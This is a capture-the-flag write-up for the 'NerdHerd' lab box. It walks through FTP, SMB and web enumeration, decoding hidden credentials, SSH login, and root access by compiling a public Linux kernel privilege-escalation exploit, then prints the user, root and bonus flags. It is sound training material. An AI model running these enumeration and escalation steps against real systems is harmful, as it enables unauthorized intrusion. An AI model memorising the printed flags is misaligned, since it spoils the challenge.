# NerdHerd

Hack your way into this easy/medium level legendary TV series "Chuck" themed box!

This is the very first vulnerable machine that I've created. So, feel free to share your opinions/advices with me on my DC: 0xpr0N3rd (alright maybe for nudges too)

I've enjoyed developing this box and I hope you enjoy it while solving.

Hack this machine before nerd herd fellas arrive, happy hacking!!!

# User Flag

## Services

Run a full Nmap scan and discover the following services:

~~~
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.50.72
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 0c:84:1b:36:b2:a2:e1:11:dd:6a:ef:42:7b:0d:bb:43 (RSA)
|   256 e2:5d:9e:e7:28:ea:d3:dd:d4:cc:20:86:a3:df:23:b8 (ECDSA)
|_  256 ec:be:23:7b:a9:4c:21:85:bc:a8:db:0e:7c:39:de:49 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
1337/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: Host: NERDHERD; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h00m00s, deviation: 1h43m55s, median: 0s
|_nbstat: NetBIOS name: NERDHERD, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: nerdherd
|   NetBIOS computer name: NERDHERD\x00
|   Domain name: \x00
|   FQDN: nerdherd
|_  System time: 2021-05-23T21:40:21+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-23T18:40:22
|_  start_date: N/A
~~~

## FTP

The FTP service will confirm that "all you need is leet" (port `1337`) and will give you a PNG file:

~~~
┌──(kali㉿kali)-[/data/NerdHerd]
└─$ ftp 10.10.14.173
Connected to 10.10.14.173.
220 (vsFTPd 3.0.3)
Name (10.10.14.173:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
drwxr-xr-x    2 ftp      ftp          4096 Sep 14  2020 .jokesonyou
-rw-rw-r--    1 ftp      ftp         89894 Sep 11  2020 youfoundme.png
226 Directory send OK.
ftp> get youfoundme.png
local: youfoundme.png remote: youfoundme.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for youfoundme.png (89894 bytes).
226 Transfer complete.
89894 bytes received in 0.28 secs (308.0530 kB/s)
ftp> cd .jokesonyou
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Sep 14  2020 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 11  2020 ..
-rw-r--r--    1 ftp      ftp            28 Sep 14  2020 hellon3rd.txt
226 Directory send OK.
ftp> get hellon3rd.txt -
remote: hellon3rd.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for hellon3rd.txt (28 bytes).
all you need is in the leet
226 Transfer complete.
28 bytes received in 0.08 secs (0.3348 kB/s)
~~~

The image contains an important information in the EXIF tags:

~~~
┌──(kali㉿kali)-[/data/NerdHerd/files]
└─$ /data/src/exiftool-12.00/exiftool youfoundme.png 
ExifTool Version Number         : 12.00
File Name                       : youfoundme.png
Directory                       : .
File Size                       : 88 kB
File Modification Date/Time     : 2021:05:23 20:27:49+02:00
File Access Date/Time           : 2021:05:23 20:29:32+02:00
File Inode Change Date/Time     : 2021:05:23 20:29:27+02:00
File Permissions                : rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 894
Image Height                    : 894
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 3543
Pixels Per Unit Y               : 3543
Pixel Units                     : meters
Warning                         : [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)
Datecreate                      : 2010-10-26T08:00:31-07:00
Datemodify                      : 2010-10-26T08:00:31-07:00
Software                        : www.inkscape.org
EXIF Orientation                : 1
Exif Byte Order                 : Big-endian (Motorola, MM)
Resolution Unit                 : inches
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
Flashpix Version                : 0100
Owner Name                      : fijbxslz <------------------- interesting information
Image Size                      : 894x894
Megapixels                      : 0.799
~~~

Owner name: `fijbxslz`. Doesn't look like a username (encoded?)

## Samba

There is a Samba share (`nerdherd_classified`) but we need an authentication:

~~~
┌──(kali㉿kali)-[/data/NerdHerd/files]
└─$ smbclient -L //10.10.14.173                   
Enter WORKGROUP\kali's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	nerdherd_classified Disk      Samba on Ubuntu
	IPC$            IPC       IPC Service (nerdherd server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
                                                                                                                    
┌──(kali㉿kali)-[/data/NerdHerd/files]
└─$ smbclient //10.10.14.173/nerdherd_classified
Enter WORKGROUP\kali's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
~~~

Running `enum4linux` will give us a username: `chuck`:

~~~
┌──(kali㉿kali)-[/data/vpn]
└─$ enum4linux -a 10.10.14.173                                                                                  127 ⨯
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun May 23 20:37:20 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.14.173
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =================================================== 
|    Enumerating Workgroup/Domain on 10.10.14.173    |
 =================================================== 
[+] Got domain/workgroup name: WORKGROUP

 =========================================== 
|    Nbtstat Information for 10.10.14.173    |
 =========================================== 
Looking up status of 10.10.14.173
	NERDHERD        <00> -         B <ACTIVE>  Workstation Service
	NERDHERD        <03> -         B <ACTIVE>  Messenger Service
	NERDHERD        <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
	WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ==================================== 
|    Session Check on 10.10.14.173    |
 ==================================== 
[+] Server 10.10.14.173 allows sessions using username '', password ''

 ========================================== 
|    Getting domain SID for 10.10.14.173    |
 ========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ===================================== 
|    OS information on 10.10.14.173    |
 ===================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.14.173 from smbclient: 
[+] Got OS info for 10.10.14.173 from srvinfo:
	NERDHERD       Wk Sv PrQ Unx NT SNT nerdherd server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================ 
|    Users on 10.10.14.173    |
 ============================ 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: chuck	Name: ChuckBartowski	Desc: 

user:[chuck] rid:[0x3e8]

[REDACTED]

~~~

## Web service (port 1337)

Connecting to port 1337 shows a modified/hacked default Apache page. It reveals a link to a youtube video: "The Trashmen - Surfin Bird - Bird is the Word 1963 (RE-MASTERED) (ALT End Video) (OFFICIAL VIDEO)"

~~~
┌──(kali㉿kali)-[/data/NerdHerd/files]
└─$ curl -s http://10.10.14.173:1337 | tail -n 15

<body onload="alertFunc()">

<script>
function alertFunc() {
  alert("HACKED by 0xpr0N3rd");
  alert("Just kidding silly.. I left something in here for you to find")
}
</script>

<p>Maybe the answer is in <a href="https://www.youtube.com/watch?v=9Gc4QTqslN4">here</a>.</p>

</body>
</html>
~~~

The video is a song from "The Trashmen" called "Bird is the Word".

Further enumerating the web server reveals an `/admin` location:

~~~
┌──(kali㉿kali)-[/data/NerdHerd/files]
└─$ gobuster dir -u http://10.10.14.173:1337 -w /usr/share/wordlists/dirb/common.txt                                 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.14.173:1337
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/05/23 20:45:25 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 317] [--> http://10.10.14.173:1337/admin/]
/index.html           (Status: 200) [Size: 11755]                                   
/server-status        (Status: 403) [Size: 278]                                     
                                                                                    
===============================================================
2021/05/23 20:46:09 Finished
===============================================================
~~~

The `/admin/` page reveals base64 encoded credentials: 

~~~
<!--
	these might help:
		Y2liYXJ0b3dza2k= : aGVoZWdvdTwdasddHlvdQ==
-->
~~~

However, it seems that one of these strings is wrongly encoded:

~~~
┌──(kali㉿kali)-[/data/NerdHerd/files]
└─$ echo "Y2liYXJ0b3dza2k=" | base64 -d
cibartowski                                                                                                                    
┌──(kali㉿kali)-[/data/NerdHerd/files]
└─$ echo "aGVoZWdvdTwdasddHlvdQ==" | base64 -d
hehegou<j�][�base64: invalid input
~~~

## Credentials

At this stage, we haven't collected valid credentials, and it seems that the `fijbxslz` string collected is encrypted. Let's try to decrypt it as Vigenere (https://cryptii.com/).

Vigenere: `fijbxslz` decodes as `easypass` with the key `birdistheword` (title from the song).

Let's connect as `chuck` with password `easypass`.

## Another hidden location 

Connecting to the Samba share with the authentication collected just above reveals another location:

~~~
──(kali㉿kali)-[/data/NerdHerd/files]
└─$ smbclient -U chuck //10.10.14.173/nerdherd_classified                                                        1 ⨯
Enter WORKGROUP\chuck's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep 11 03:29:53 2020
  ..                                  D        0  Thu Nov  5 21:44:40 2020
  secr3t.txt                          N      125  Fri Sep 11 03:29:53 2020

		8124856 blocks of size 1024. 3408648 blocks available
smb: \> get secr3t.txt -
Ssssh! don't tell this anyone because you deserved it this far:

	check out "/this1sn0tadirect0ry"

Sincerely,
	0xpr0N3rd
<3
getting file \secr3t.txt of size 125 as - (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> 
~~~

Browsing the `/this1sn0tadirect0ry/` location reveals credentials:

~~~
┌──(kali㉿kali)-[/data/NerdHerd/files]
└─$ curl -s http://10.10.14.173:1337/this1sn0tadirect0ry/ | html2text
****** Index of /this1sn0tadirect0ry ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[TXT]]       creds.txt        2020-09-11 04:36   84  
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at 10.10.14.173 Port 1337

┌──(kali㉿kali)-[/data/NerdHerd/files]
└─$ curl -s http://10.10.14.173:1337/this1sn0tadirect0ry/creds.txt   
alright, enough with the games.

here, take my ssh creds:
	
	chuck : th1s41ntmypa5s
~~~

## Chuck's SSH credentials

Now, we can connect as `chuck`:

~~~
┌──(kali㉿kali)-[/data/NerdHerd/files]
└─$ sshpass -p "th1s41ntmypa5s" ssh chuck@10.10.14.173
Welcome to Ubuntu 16.04.1 LTS (GNU/Linux 4.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

747 packages can be updated.
522 updates are security updates.

Last login: Wed Oct 14 17:03:42 2020 from 22.0.97.11
chuck@nerdherd:~$ cat user.txt 
THM{7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}
~~~

User flag: `THM{7fc91d70e22e9b70f98aaf19f9a1c3ca710661be}`

# Root Flag

Running `linpeas.sh` will identify a very old kernel, which we can confirm:

~~~
chuck@nerdherd:~$ uname -a
Linux nerdherd 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
~~~

The host is running Ubuntu 16.04. Let's check privilege escalation exploits:

~~~
┌──(kali㉿kali)-[/data/NerdHerd/files]
└─$ searchsploit ubuntu 16.04 privilege escalation
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                        | linux/local/40054.c
LightDM (Ubuntu 16.04/16.10) - 'Guest Account' Local Privilege Escalation            | linux/local/41923.txt
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 / Cen | linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ldso_ | linux_x86/local/42276.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)      | linux/local/40759.rb
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privileg | linux_x86-64/local/40871.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds P | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Conditi | windows_x86-64/local/47170.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Es | linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escalati | linux/local/40489.txt
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation        | linux/local/45010.c <---------------- Use this one
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation               | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privile | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalati | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Loca | linux/local/47169.c
------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
~~~

Download `45010.c` and compile it on the target to get a root shell:

~~~
chuck@nerdherd:~$ gcc exploit.c -o exploit
chuck@nerdherd:~$ ./exploit 
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88001b1c0b00
[*] Leaking sock struct from ffff880018a3bc00
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff880007f86300
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff880007f86300
[*] credentials patched, launching shell...
# cat /root/root.txt
cmon, wouldnt it be too easy if i place the root flag here?
~~~

## Root flag

The `root.txt` flag was not the root flag, but there is a hidden `.root.txt` file somewhere else:

~~~
# find / -type f -name "*root.txt" 2>/dev/null
/root/root.txt
/opt/.root.txt
# cat /opt/.root.txt
nOOt nOOt! you've found the real flag, congratz!

THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}
~~~

Root flag: `THM{5c5b7f0a81ac1c00732803adcee4a473cf1be693}`

# Bonus Flag

*Hint: brings back so many memories*

The hint referes to "memories", which reminds the bash history. Let's check:

~~~
root@nerdherd:/root# cat /root/.bash_history 

[REDACTED]

cp youfoundme.png /home/chuck/Desktop/
ls -la
rm youfoundme.png 
THM{a975c295ddeab5b1a5323df92f61c4cc9fc88207}
mv /home/chuck/Downloads/youfoundme.png .
rm youfoundme.png 
mv /home/chuck/Downloads/youfoundme.png .


[REDACTED]
~~~

Bonus flag: `THM{a975c295ddeab5b1a5323df92f61c4cc9fc88207}`
